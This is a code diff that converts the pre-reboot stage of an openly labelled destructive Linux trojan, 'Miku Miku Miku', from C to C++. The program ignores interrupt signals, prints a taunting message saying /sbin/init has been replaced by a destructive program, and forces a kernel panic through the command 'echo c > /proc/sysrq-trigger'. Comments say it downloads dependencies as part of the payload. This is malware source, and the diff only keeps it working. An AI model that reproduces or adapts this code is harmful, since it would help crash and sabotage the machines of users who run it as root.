@@ -1,16 +1,16 @@
-#include <stdio.h>
-#include <stdlib.h>
+#include <iostream>
+#include <cstdlib>
 #include <unistd.h>
-#include <signal.h>
+#include <csignal>
 
 // The pre-reboot part of Miku Miku Miku.
 // The system is guaranteed to reboot anyway here, this is just what the user sees before a kernel panic.
 
 int main()
 {
-    signal(SIGINT, SIG_IGN);
+    std::signal(SIGINT, SIG_IGN);
 
-    printf("You ran this as Root, eh? If you did, Hatsune Miku turned evil and FUCKED your PC!!!\n/sbin/init has been replaced with a destructive program.\nI have a surprise at the end of the payload however. Stick around to find out what it is!");
+    std::cout << "You ran this as Root, eh? If you did, Hatsune Miku turned evil and FUCKED your PC!!!\n/sbin/init has been replaced with a destructive program.\nI have a surprise at the end of the payload however. Stick around to find out what it is!";
 
     // Downloading some dependencies for the trojan.
     // The payload doesn't work right without mpv.
@@ -26,5 +26,5 @@ int main()
     // This is the end of the pre-reboot payload. IT'S KERNEL PANIC TIME!!!!!
     system("echo c > /proc/sysrq-trigger");
 
-    return 0;
+    return EXIT_SUCCESS;
 }
